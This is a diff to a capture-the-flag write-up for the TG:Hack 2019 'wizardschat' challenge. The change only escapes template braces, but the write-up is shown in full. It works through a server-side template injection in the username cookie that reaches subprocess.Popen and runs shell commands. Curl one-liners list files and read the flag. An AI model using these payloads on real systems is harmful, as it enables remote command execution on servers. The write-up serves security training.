@@ -56,7 +56,7 @@ layout: default
 
   __Notes__:
   - The chat filters __"<"__ and __">"__ to __\&lt;__ and __\&gt;__ respectively
-  - The chat retains __{{ }}__ but does not interpret them.
+  - The chat retains __\{\{ \}\}__ but does not interpret them.
   - The chat seems to be a rabbit hole.
     - All messages sent by users are output through the chat.
     - The __username__ and __message__ are exposed if it involves a payload. 
@@ -70,7 +70,7 @@ layout: default
     GET / HTTP/1.1
     Host: wizardschat.tghack.no
     ...
-    Cookie: username={{ self.__class__ }}
+    Cookie: username={&#123; self.__class__ }}
     ...
     ```
   - Rendered Response:
@@ -93,7 +93,7 @@ layout: default
      GET / HTTP/1.1
      Host: wizardschat.tghack.no
      ...
-     Cookie: username={{ self.__class__.__mro__ }}
+     Cookie: username={&#123; self.__class__.__mro__ }}
      ...
      ```
    - Rendered Response:
@@ -114,7 +114,7 @@ layout: default
      GET / HTTP/1.1
      Host: wizardschat.tghack.no
      ...
-     Cookie: username={{ self.__class__.__mro__[-1].__subclasses__() }}
+     Cookie: username={&#123; self.__class__.__mro__[-1].__subclasses__() }}
      ...
      ```
    - Rendered Response:
@@ -133,7 +133,7 @@ layout: default
      GET / HTTP/1.1
      Host: wizardschat.tghack.no
      ...
-     Cookie: username={{ self.__class__.__mro__[-1].__subclasses__()[181] }}
+     Cookie: username={&#123; self.__class__.__mro__[-1].__subclasses__()[181] }}
      ...
      ```
    - Rendered Response:
@@ -152,7 +152,7 @@ layout: default
      GET / HTTP/1.1
      Host: wizardschat.tghack.no
      ...
-     Cookie: username={{ self.__class__.__mro__[-1].__subclasses__()[181]("id", shell=True, stdout=-1).communicate() }}
+     Cookie: username={&#123; self.__class__.__mro__[-1].__subclasses__()[181]("id", shell=True, stdout=-1).communicate() }}
      ...
      ```
    - Rendered Response:
@@ -170,7 +170,7 @@ layout: default
 ## Step 4 : Extract the flag
 
 ```sh
-payload="{{ self.__class__.__mro__[-1].__subclasses__()[181](\"ls -la\", shell=True, stdout=-1).communicate() }}"
+payload="{&#123; self.__class__.__mro__[-1].__subclasses__()[181](\"ls -la\", shell=True, stdout=-1).communicate() }}"
 curl -b "username=$payload" https://wizardschat.tghack.no/ | sed -ne 's/^.*Username:\(.*\)$/&/p'
 
 # total 28
@@ -182,10 +182,10 @@ curl -b "username=$payload" https://wizardschat.tghack.no/ | sed -ne 's/^.*Usern
 # -rwxr-xr-x    1 root     root          29 Apr 18 14:00 requirements.txt
 # -rwxr-xr-x    1 root     root         827 Apr 16 07:09 upload.php
 
-payload="{{ self.__class__.__mro__[-1].__subclasses__()[181](\"cat ./flag.txt\", shell=True, stdout=-1).communicate() }}"
+payload="{&#123; self.__class__.__mro__[-1].__subclasses__()[181](\"cat ./flag.txt\", shell=True, stdout=-1).communicate() }}"
 curl -b "username=$payload" https://wizardschat.tghack.no/ | sed -ne 's/^.*Username:\(.*\)$/&/p'
 
 # Username: (b&#39;TG19{templates_make_a_better_chat}\n&#39;, None)
 ```
 ---
-## FLAG : __TG19{templates_make_a_better_chat}__
+## FLAG : __TG19&#123;templates_make_a_better_chat}__
